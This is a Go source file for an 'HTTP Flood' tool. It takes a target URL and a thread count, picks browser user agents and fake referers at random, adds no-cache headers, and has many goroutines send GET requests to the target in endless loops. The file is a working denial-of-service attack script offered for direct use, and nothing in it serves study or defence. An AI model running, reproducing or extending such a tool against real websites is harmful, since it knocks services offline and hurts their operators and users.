package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"time"

	"github.com/valyala/fasthttp"
)

var target struct {
	url string
}

func userAgents(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, fmt.Errorf("error opening file: %v", err)
	}
	defer file.Close()
	var userAgents []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		userAgent := scanner.Text()
		userAgents = append(userAgents, userAgent)
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading file: %v", err)
	}

	if len(userAgents) == 0 {
		return nil, fmt.Errorf("file is empty")
	}

	return userAgents, nil
}

func httpHeader(req *fasthttp.Request, userAgents []string) {
	rand.NewSource(time.Now().Unix())

	referers := []string{
		"https://google.com/?q=",
		"https://github.com/",
		"https://golang.org/",
		"https://www.facebook.com",
		"https://www.instagram.com",
	}

	randomUA := rand.Intn(len(userAgents))
	randomReferer := rand.Intn(len(referers))

	req.Header.Set("User-Agent", userAgents[randomUA])
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Referer", referers[randomReferer])
	req.Header.Set("Pragma", "no-cache")
}

func runFlood(userAgents []string) {
	client := fasthttp.Client{}

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	req.SetRequestURI(target.url)
	req.Header.SetMethod("GET")

	httpHeader(req, userAgents)

	for {
		client.Do(req, nil)
	}
}

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: go run main.go <url> <threads>")
		return
	}

	target.url = os.Args[1]

	threads, err := strconv.Atoi(os.Args[2])

	if err != nil {
		fmt.Println("Invalid number of threads", err)
		return
	}

	fmt.Println("HTTP Flood")

	userAgents, err := userAgents("useragents.txt")
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	for i := 0; i < threads; i++ {
		go runFlood(userAgents)
	}

	select {}
}
